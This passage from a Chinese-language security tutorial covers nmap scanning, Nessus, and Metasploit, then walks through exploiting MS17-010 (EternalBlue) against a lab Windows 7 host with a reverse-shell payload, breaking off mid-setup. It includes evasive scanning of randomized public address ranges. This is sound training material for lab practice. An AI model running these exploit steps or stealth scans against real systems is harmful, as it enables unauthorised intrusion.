+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -v <span class="hljs-number">192.168.201.129</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/E89206766F0242acB0EB13D2491E1E3F.png" srcset="/img/loading.gif" lazyload></p>
+<p>例3：扫描一个范围：端口1-65535</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.201.129</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/9C994AE89616486a89298DE3F5629628.png" srcset="/img/loading.gif" lazyload></p>
+<p>注：生产环境下，我们只需要开启正在提供服务的端口，其他端口都关闭。</p>
+<p>关闭不需要开的服务有两种方法：<br>情景1：你认识这个服务，直接关服务</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">systemctl stop xxxx<br></code></pre></td></tr></table></figure>
+
+<p>情景2：不认识这个服务，查看哪个进程使用了这个端口并找出进程的路径，然后kill进程，删除文件，接下来以22端口为例，操作思路如下：</p>
+<ol>
+<li>查看22端口正在被哪个进程使用</li>
+</ol>
+<p><img src="/images/83D0822D133B404aA8EB12DCAE80FC9B.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>通过ps命令查找对应的进程文件：</li>
+</ol>
+<p><img src="/images/CF2F95899F764a7286FBDA0B7503B57C.png" srcset="/img/loading.gif" lazyload></p>
+<p>注：看到进程的文件路径是&#x2F;usr&#x2F;sbin&#x2F;sshd。如果没有看到此命令的具体执行路径，说明此木马进程可以在bash终端下直接执行。通过which和rpm -qf来查看此命令的来源，如下：<br><img src="/images/C535733643C54370A472ADF5649EDE60.png" srcset="/img/loading.gif" lazyload></p>
+<p>解决：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">38515</span><br><br></code></pre></td></tr></table></figure>
+<p>总结：这个思路主要用于找出黑客监听的后门端口和木马存放的路径。</p>
+<p>例4： 扫描一台机器：查看此服务器开放的端口号和操作系统类型。</p>
+<p><img src="/images/5F7EFFAC3EE22e38F345425BDD690A3.png" srcset="/img/loading.gif" lazyload></p>
+<p>参数说明：<br>-O：显示出操作系统的类型，每一种操作系统都有一个指纹。<br>-sS：半开扫描<br>TCP同步扫描(TCP SYN)：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应，如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上由我们的操作系统内核自动完成的。</p>
+<p>当服务器端口开放时，半连接扫描过程如图<br><img src="/images/8BE3178251D9431f9FAE91E40F51F4D3.png" srcset="/img/loading.gif" lazyload></p>
+<p>当服务器端口关闭时。半连接扫描过程如图<br><img src="/images/53D83F17EE634c1390AB06ED6035E2FB.png" srcset="/img/loading.gif" lazyload></p>
+<p>例5：扫描一个网段中所有机器是什么类型的操作系统</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS -O <span class="hljs-number">192.168.201.0</span>/<span class="hljs-number">24</span>  <br></code></pre></td></tr></table></figure>
+
+<p>例6：查找一些有特点的IP地址中，开启80端口的服务器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v -p <span class="hljs-number">80</span> <span class="hljs-number">192.168.201.127</span>-<span class="hljs-number">131</span> <br></code></pre></td></tr></table></figure>
+
+
+<p>例7：如何更隐藏的去扫描，频繁扫描会被屏蔽或者锁定IP地址</p>
+<p>–randomize_hosts #随机扫描，对目标主机的顺序随机划分</p>
+<p>–scan-delay #演示扫描，单位秒，调整探针之间的延迟</p>
+<ol>
+<li><p>随机扫描</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v --randomize-hosts -p <span class="hljs-number">80</span> <span class="hljs-number">192.168.201.127</span>-<span class="hljs-number">131</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>随机扫描+延时扫描，默认单位秒</p>
+</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v --randomize-hosts --scan-delay <span class="hljs-number">1000</span>ms -p <span class="hljs-number">80</span> <span class="hljs-number">192.168.201.127</span>-<span class="hljs-number">131</span>   <br></code></pre></td></tr></table></figure>
+
+<p>例8：使用通配符指定IP地址</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v --randomize-hosts --scan-delay <span class="hljs-number">30</span> -p <span class="hljs-number">80</span> <span class="hljs-number">1</span>.*.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="NESSUS-漏洞检测"><a href="#NESSUS-漏洞检测" class="headerlink" title="NESSUS 漏洞检测"></a>NESSUS 漏洞检测</h1><h2 id="NESSUS简介"><a href="#NESSUS简介" class="headerlink" title="NESSUS简介"></a>NESSUS简介</h2><p>1998年，Nessus的创办人Renaud Deraison 展开了一项名为”Nessus”的计划，其计划目的是希望能为互联网社群提供一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程式。2002年时，Renaud与Ron Gula,Jack Huffard 创办了一个名为Tenable Network Security 机构。在第三版的 Nessus 释出之时，该机构收回了 Nessus 的版权与程式源代码(原本为开放源代码)，并注册了nessus.org 成为该机构的网站。目前此机构位于美国马里兰州的哥伦比亚。</p>
+<p>实验环境：因为NESSUS占用内存比较大，做这个实验需要将Kali内存调到6G或8G。</p>
+<p><a target="_blank" rel="noopener" href="https://www.tenable.com/downloads/nessus">https://www.tenable.com/downloads/nessus</a></p>
+<p>官网下载</p>
+<p>上传到kali</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dpkg</span> -i Nessus-<span class="hljs-number">10</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-debian10_amd64.deb<br></code></pre></td></tr></table></figure>
+<p>按照提示输入命令</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>systemctl start nessusd.service<br></code></pre></td></tr></table></figure>
+<p><img src="/images/DC0F76EA35A0436193312A87E926FC1C.png" srcset="/img/loading.gif" lazyload></p>
+<p>谷歌浏览器打开</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span>:<span class="hljs-number">8834</span>/<br></code></pre></td></tr></table></figure>
+
+<p>由于官网只有10版本的最新版本，而我的最新版本出现了一些预期外的错误，所以我找了一个旧版本6代版本。</p>
+<h2 id="配置扫描windows主机"><a href="#配置扫描windows主机" class="headerlink" title="配置扫描windows主机"></a>配置扫描windows主机</h2><p>开启一台XP主机 IP是：192.168.201.130</p>
+<p>登录Nessus</p>
+<p>new scan-&gt;advanced scan-&gt;name随意-&gt;Targets192.168.201.130-&gt;Creaentials-&gt;username-&gt;passwd-&gt;save-&gt;launch</p>
+<p><img src="/images/17396658C6244eb9B47887D2BC490E59.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/66D2EE5CCCE84475A2D8E4CA6C8F1776.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="配置扫描Web服务"><a href="#配置扫描Web服务" class="headerlink" title="配置扫描Web服务"></a>配置扫描Web服务</h2><p>新的扫描，点击最后一个web扫描<br><img src="/images/0FEFF0FC4ECB4f36AE6A708473AD4F9F.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/43CB4AE4F585401dA5F5E148F07C6C85.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/E8D8BC62729745399D25368D0040406.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/EC22A486E1CF4e4eB0B4C3BEBB8FAC75.png" srcset="/img/loading.gif" lazyload><br>一般网站是没有漏洞的，所以我们这只扫出了80端口是开放的</p>
+<h1 id="Metasploit-渗透测试框架的基本使用"><a href="#Metasploit-渗透测试框架的基本使用" class="headerlink" title="Metasploit 渗透测试框架的基本使用"></a>Metasploit 渗透测试框架的基本使用</h1><h2 id="Metasploit-渗透测试框架介绍"><a href="#Metasploit-渗透测试框架介绍" class="headerlink" title="Metasploit 渗透测试框架介绍"></a>Metasploit 渗透测试框架介绍</h2><h3 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h3><p>Metasploit是一个渗透测试平台，使您能够查找，利用和验证漏洞，该平台包括Metasploit框架及其商业对手，如Metasploit Pro。</p>
+<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易对计算机软件漏洞实施攻击，它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D.Moore在2003年发布Metasploit时，计算机安全状况也被永久性的改变了，仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞，软件厂商再也不能推迟发布针对已公布漏洞的补丁了。这是因为Metasploit团队已知都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。</p>
+<p>Metasploit的设计初衷是打造成一个攻击工具开发平台<br><a target="_blank" rel="noopener" href="https://www.metasploit.com/">官网</a></p>
+<p><img src="/images/8515713C8E724a6c9DBB9EA25B8468BF.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li>基础库：metasploit基础库文件位于源码根目录路径下的libraies目录中，包括Rex，framework-core和framework-base 三部分。</li>
+</ol>
+<p><strong>Rex是整个框架所依赖的最基础的一些组件</strong>，如包装的网路套接字，网络应用协议客户端与服务端实现，日志子系统，渗透攻击支持例程，PostgreSQL以及MySQL数据库支持等；</p>
+<p>framework-core库负责实现所有与各种类型的上层模块及插件的交互接口；<br>framework-base库扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；</p>
+<ol start="2">
+<li>模块：模块组织按照不同的用途分为6种类型的模块(Modules)：<br>分为辅助模块(Aux)、渗透攻击模块(Exploits)、后渗透攻击模块(Post)、攻击载荷模块(payloads)、编码器模块(Encoders)、空指令模块(Nops)。</li>
+</ol>
+<p>注：payload又称为攻击载荷，主要用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。</p>
+<ol start="3">
+<li><p>插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件，插件可以集成现有的一些安全工具，如Nessus、OpenVAS漏洞扫描器等，为用户接口提供一些新的功能。</p>
+</li>
+<li><p>接口：包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。</p>
+</li>
+<li><p>功能程序：metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速的利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件，C语言，javaScript语言等多种形式，并可以进行各种类型的编码。</p>
+</li>
+</ol>
+<h3 id="Metasploit目录结构"><a href="#Metasploit目录结构" class="headerlink" title="Metasploit目录结构"></a>Metasploit目录结构</h3><p>切换到Metasploit工作目录</p>
+<p><img src="/images/FAF1E0D5F91445eaBB30CFCD1A42EF65.png" srcset="/img/loading.gif" lazyload></p>
+<p>data: Metasploit使用的可编辑文件<br>documentation：为框架提供文档<br>lib：框架代码库<br>modules：实际的MSF模块<br>plugins：可以在运行时加载的插件<br>script：Meterpreter和其它脚本<br>tools：各种有用的命令行工具</p>
+<h2 id="Metasploitable2-Linux-靶机系统介绍"><a href="#Metasploitable2-Linux-靶机系统介绍" class="headerlink" title="Metasploitable2-Linux 靶机系统介绍"></a>Metasploitable2-Linux 靶机系统介绍</h2><h3 id="Metasploitable2靶机介绍"><a href="#Metasploitable2靶机介绍" class="headerlink" title="Metasploitable2靶机介绍"></a>Metasploitable2靶机介绍</h3><p>Metasploitable2 虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞，这个版本的虚拟系统兼容VMware，VirtualBox和其他虚拟平台。<br>网上找这个靶机的虚拟机文件，用vmware打开就行了</p>
+<h2 id="Metasploit-基本使用方法"><a href="#Metasploit-基本使用方法" class="headerlink" title="Metasploit 基本使用方法"></a>Metasploit 基本使用方法</h2><p>Metasploit基本命令</p>
+<p>Metasploit程序需要使用Postgresql数据库</p>
+<p>Postgresql概述：<br>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统(ORDBMS),是以加州大学计算机系开发的POSTGRES 4.2版本为基础的对象关系型数据库管理系统。<br>官网：<a target="_blank" rel="noopener" href="https://www.postgresql.org/">https://www.postgresql.org/</a></p>
+<p>注：PostgreSQL：世界上最先进的开源关系数据库<br>扩展：PostgreSQL和MySQL数据的应用场景区别：<br>从应用场景来说，PostgreSQL更加适合严格的企业应用场景(比如金融、电信、ERP、CRM)，而Mysql更加适合业务逻辑相对简单、数据可靠性要求较低的互联网场景。</p>
+<p>在kali上手动启动数据库</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿yasuo)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl start postgresql<br>                                                                             <br>┌──(root㉿yasuo)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl enable postgresql #开机自启<br><br></code></pre></td></tr></table></figure>
+
+<p>命令行输入msfconsole<br><img src="/images/155E8D3AB70942d9B9D961D3C4621702.png" srcset="/img/loading.gif" lazyload><br>启动完成后会有一些统计信息，比如说版本号，有多少个exploits，多少个payloads等。</p>
+<p><img src="/images/655B970225F74dfeAD8D1D02EC8084F.png" srcset="/img/loading.gif" lazyload></p>
+<p>注:通过 help 查看帮助，可以对msf有个整体认识，可以看到msf相关命令可以分成以下类型:<br>Core Commands   #核心命令。<br>Module Commands #模块命令<br>Job Commands    #后台任务命令<br>Resource Script Commands    #资源脚本命令<br>Database Backend Commands   #数据库后端命令<br>Credentials Backend Commands    #证书&#x2F;凭证后端命令<br>Developer Commands  #开发人员命令</p>
+<p>常用命令</p>
+<ol>
+<li>核心命令中的connect命令</li>
+</ol>
+<p>connect命令主要用于远程连接主机，一般用于内网渗透，比较常用的命令就是“connect 192.168.1.1 80”</p>
+<p>查看connect命令参数：<br>connect<br><img src="/images/E891FFD7BDD54c5aB884C209BAC4B26E.png" srcset="/img/loading.gif" lazyload></p>
+<p>连接目标80端口<br>连接后在另一行，直接输入get &#x2F; 提交一个get请求，可以看到服务器版本号<br><img src="/images/02DD4F1133BE45768040EF54EEAEC14D.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>模块相关的命令show使用方法</li>
+</ol>
+<p>show命令用的很多</p>
+<p>“show”命令的有效参数是：all，encoders，nops，exploits，payloads，auxiliary，post，plugins，info，options</p>
+<p>列出metasploit框架中的所有渗透攻击模块，该命令列出数据较多，较为耗费时间。<br><img src="/images/2C736CC0D29240d89D15768E0CA773C3.png" srcset="/img/loading.gif" lazyload></p>
+<p>show payloads #列出metasploit框架中所有攻击载荷</p>
+<p>show auxiliary #列出metasploit框架中所有辅助攻击载荷</p>
+<ol start="3">
+<li>模块相关的命令search搜索的使用方法</li>
+</ol>
+<p>当你使用msfconsole的时候，你会用到各种漏洞模块，各种插件等等，所以search搜索命令就很重要。</p>
+<p>当你输入search -h会列出search命令的一些选项。</p>
+<p><img src="/images/08119D4AF62F436b9426656315C2E5F5.png" srcset="/img/loading.gif" lazyload></p>
+<p>例1：通过name关键字进行查找</p>
+<p>这里需要用到name：命令</p>
+<p>search mysql #search后直接跟要查找内容，查的很广泛，只有当你对漏洞名字描述很清楚时，使用这个方法</p>
+<p>例：先查找出自己想要的ms08-067漏洞模块。</p>
+<p><img src="/images/09B9C04173D94eb3846B6631FB472CFC.png" srcset="/img/loading.gif" lazyload></p>
+<p>每列的含义是<br><img src="/images/4EB8C2B91E154d18A18A00184BF9868F.png" srcset="/img/loading.gif" lazyload></p>
+<p>每一个漏洞利用模块基于它们对目标系统的潜在影响都被标记了一个Rank字段<br>用户可以基于Rank对漏洞利用模块进行搜索，分类以及排序</p>
+<p>Rank 按照可靠性降序排列:<br>excellent：漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入、命令执行、远程文件包含、本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。<br>great：该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定的返回地址。“<br>good：该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”(桌面应用程序的Windows7，服务器的2012等)<br>normal：该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。<br>average：该漏洞利用程序不可靠或者难以利用。←<br>low：对于通用的平台而言，该漏洞利用程序几乎不能利用(或者低于 50% 的利用成功率)<br>manual：该漏洞利用程序不稳定或者难以利用并且基于拒绝服务(DOS)。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。</p>
+<p>例2：通过路径进行查找</p>
+<p>有时候，我们只记得模块的路径，但是却忘记了模块的名称，那么就可以用path：命令查找在该路径下的所有模块，如果我要mysql路径下的所有mysql利用模块，那么就输入search path:mysql</p>
+<p>例3：缩小查询范围<br>关键字：platform<br>作用：Modules affecting this platform 即：列出可以影响此平台的模块，也就是比较好的漏洞<br>有时候我们会搜索到大量的模块，那么可以用platform：命令来缩小查询范围，使用platform命令后，所查询的结果会列出rank比较高的模块，如果我要查找mysql的漏洞，那么就输入：search platform:mysql</p>
+<p>例4：通过类型进行查找</p>
+<p>这里要使用到type：命令<br>type：特定类型的模块(exploit, payload, auxiliary, encoder, evasion, post, or nop)<br>要搜索exploit模块，那么就输入：<br>search type:exploit</p>
+<p>例5：联合查找<br>大家可以使用上面的参数自行搭配使用，如果我要查找mysql的exploit相关漏洞，那么输入：search name:mysql type:exploit</p>
+<p>例6：根据CVE搜索exploit相关模块</p>
+<p>CVE概述：CVE的英文全称是”Common Vulnerabilities &amp; Exposures” 公共漏洞和暴露。<br>CVE就好像是一个字典表，为广泛认同的信息安全漏调或者己经暴露出来的开点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞估工具中共享数据，虽然这些工具很难整合在一起。这样就使得 CVE成为了安全信息共享的“关键字”。如果在一个漏洞报告中指明的一个漏洞，如果有 CVE 名称，你就可以快速地在任何其它 CVE 兼容的数据库中找到相应修补的信息，解决安全问题。</p>
+<p>事情背景：<br>2017年Github上公开了CVE-2017-8464漏洞的metasploit-framework利用模块，利用此模块在windows 10 x64(Build 14393)版本上测试有效。</p>
+<p>现在此模块已经加入metasploit中了。<br>通过执行cve_2017_8464_lnk_rce.rb模块，将生成大量的.lnk文件(对应盘符从D到Z)和要加载的.dll文件(后门文件)。将所有样本文件拷贝到U盘里，然后将U盘插到windows7机器上，默认自动执行：<br>从而可以让我们可以远程执行命令。</p>
+<p>查找：CVE-2017-8464远程命令执行漏洞<br>search cve:CVE-2017-8464 type:exploit</p>
+<ol start="3">
+<li>模块相关的命令use的使用方法</li>
+</ol>
+<p>use使用参数，如你要使用到某个模块，就要使用到use命令<br>语法：use模块的名字</p>
+<p>实战背景：<br>2008年微软爆出ms08_067漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft Windows 2000、Windows XP和Windows Server 2003系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。此漏洞可能用于进行蠕虫攻击。</p>
+<p>1》先查找出自己想要的ms08_067漏洞模块。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms08-<span class="hljs-number">067</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/685D4CE0E34E4a4eA0E10920F82F634B.png" srcset="/img/loading.gif" lazyload><br>metasploit支持模糊查找，不区分大小写</p>
+<p>2》转载一个渗透攻击模块<br><img src="/images/84B810076A0F457f869C88926CDAF2CD.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以看到使用use装载模块后我们的bash提示符会变成对应的模块信息，稍后我们使用这个模块进行攻击。<br>也可以back退出当前调用的模块</p>
+<p>3》模块相关的命令info的使用方法</p>
+<p>info：显示模块的相关信息<br>方法1：info 模块名称</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">info exploit<span class="hljs-regexp">/windows/</span>smb/ms08_067_netapi<br></code></pre></td></tr></table></figure>
+<p>方法2:use装载模块后直接使用info</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/ms08_067_netapi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/B348C53CDDE14721A23D3D8A2EA1F02A.png" srcset="/img/loading.gif" lazyload></p>
+<p>从弹出的消息中，需要重点关注的内容是：</p>
+<ol>
+<li>可用目标，就是查看可以攻击哪些操作系统</li>
+</ol>
+<p><img src="/images/A9672BC8186049d0B1C43F666959A55B.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>Basic options：调用漏洞需要的相关参数</li>
+</ol>
+<p><img src="/images/4F354F0A7BD94a038EA4C5B37F4C77ED.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li>漏洞描述和执行过程：</li>
+</ol>
+<p><img src="/images/4CD24928C3C348fbB42E0F7E2B5B8A69.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="4">
+<li>参考文档</li>
+</ol>
+<p><img src="/images/28EA649B719543b0951BDCF1050B2DC9.png" srcset="/img/loading.gif" lazyload></p>
+<p>方法2：使用show命令查看模块的相关信息<br>show options #查看模块的选项<br><img src="/images/B6965E32EE924355959DEAAAB7DE022D.png" srcset="/img/loading.gif" lazyload></p>
+<p>show targets #查看可以攻击哪些操作系统</p>
+<p><img src="/images/784FCE2CEE15496c8070D7B946428BCB.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置RHOSTS参数，指定攻击的目标机器<br>set RHOSTS 192.168.201.130</p>
+<p>show options #查看设置的值</p>
+<p><img src="/images/1E663CB97B7C4023B7F15CBAAE3742B4.png" srcset="/img/loading.gif" lazyload></p>
+<p>配置好了之后我们输入 exploit 或 run 就可以执行该模块。<br>msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; back #使用 back 即可退出装载的模块<br>注：不要使用 exit，exit 会直接退出 Metasploit 程序</p>
+<h2 id="实战-使用msf渗透攻击win7主机并远程执行命令"><a href="#实战-使用msf渗透攻击win7主机并远程执行命令" class="headerlink" title="实战-使用msf渗透攻击win7主机并远程执行命令"></a>实战-使用msf渗透攻击win7主机并远程执行命令</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>永恒之蓝概述：</p>
+<p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers(影子经纪人)公布一大批网络攻击工具，其中包括“永恒之蓝”工具，“永恒之蓝”利用windows系统的SMB漏洞可以获取系统最高权限。5月12日，不发分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯，整个欧洲以及中国多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<p>win7是2009年发布<br>官方描述<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a><br>永恒之蓝相关病毒，其实是利用了微软的MS17-010漏洞。MS17-010是Windows 系统一个底层服务的漏洞，恶意代码会扫描开放 445 文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h3 id="通过msf模块获取win7主机远程shell"><a href="#通过msf模块获取win7主机远程shell" class="headerlink" title="通过msf模块获取win7主机远程shell"></a>通过msf模块获取win7主机远程shell</h3><p><img src="/images/F0B30967A3B84e64B47E10F812FFBFE7.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们先扫描目标是否存在ms17-010漏洞</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/FD03C88C562240b3ADF71221D06C1746.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用use使用这个模块</p>
+<p><img src="/images/3B7B3171120248ceBFFB088316F3C0BC.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看模块需要配置的信息</p>
+<p><img src="/images/18B6C5FD4C124830BE71E5FD101B8A0D.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要我们配置RHOST主机IP</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.201.133</span><br></code></pre></td></tr></table></figure>
+
+<p>开始扫描 run<br><img src="/images/4E00F94B86BD4039B9DFC46581C672CC.png" srcset="/img/loading.gif" lazyload></p>
+<p>目标看起来易受攻击，也就表示可能存在相关漏洞。</p>
+<p>查找攻击模块</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/743BDEA0B0634b50A88BEFE97F028675.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用use命令加载模块</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue <br></code></pre></td></tr></table></figure>
+<p>看看rhosts有无目标机</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+
+<p>如无目标机，则</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.201.133</span><br></code></pre></td></tr></table></figure>
+
+<p>查看exploit target目标类型</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> targets<br></code></pre></td></tr></table></figure>
+<p><img src="/images/25401BFA7ED84bad99B3E9E14AFFBAFA.png" srcset="/img/loading.gif" lazyload></p>
+<p>默认就好了，不需要手动设置<br><img src="/images/ABFA559964274a6dAD09907551D71862.png" srcset="/img/loading.gif" lazyload></p>
+<p>找一个payload，获取shell远程连接权限后，进行远程执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search windows/x64/shell <span class="hljs-built_in">type</span>:payload<br></code></pre></td></tr></table></figure>
+<p>注：payload又称为攻击载荷，主要用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。<br><img src="/images/968BF26CD5CE404492FE323C45D5296B.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们挑选一个反弹shell的payloads<br>注：设置的时候payload和windows之间有空格。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/shell_reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<p>查看一下payloads需要配置什么信息</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">show</span> options <span class="hljs-meta">#查看加载道德payload信息</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/E5FB453AFADA42c9B63FEBD3D76CA8EA.png" srcset="/img/loading.gif" lazyload><br>设置一下本机payload监听地址<br>如果lhost中为空，则需要填kali机的ip</p>
